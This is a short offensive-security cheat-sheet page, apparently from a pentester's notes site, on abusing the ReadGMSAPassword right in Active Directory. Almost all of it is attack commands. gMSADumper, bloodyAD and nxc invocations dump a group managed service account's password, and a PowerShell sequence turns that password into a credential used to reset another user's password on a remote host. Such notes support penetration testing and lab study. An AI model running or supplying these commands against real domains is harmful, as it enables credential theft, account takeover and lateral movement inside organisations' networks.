---
title: "ReadGMSAPassword"
date: 2024-7-23
tags: ["ReadGMSAPassword", "gMSADumper", "active driectory", "ad", "Windows"]
---

### Abuse #1: Read GMSAPassword (From Linux)

{{< tab set1 tab1 active >}}gMSADumper{{< /tab >}}
{{< tab set1 tab2 >}}BloodyAD{{< /tab >}}
{{< tab set1 tab3 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <DC> -d <DOMAIN>
```

</div>

<small>*Ref: [gMSADumper](https://github.com/micahvandeusen/gMSADumper)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword
```

</div>

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```console
nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --gmsa
```

</div>

{{< /tabcontent >}}

<br>

---

### Abuse #2: Save as Cred

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```console
$gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword'
```

```console
$mp = $gmsa.'msDS-ManagedPassword'
```

```console
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
```

```console
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

```console
$cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $SecPass
```

```console
# For example, change password of another target user
Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASSWORD>' -force)} -Credential $cred
```

</div>

{{< /tabcontent >}}

<br>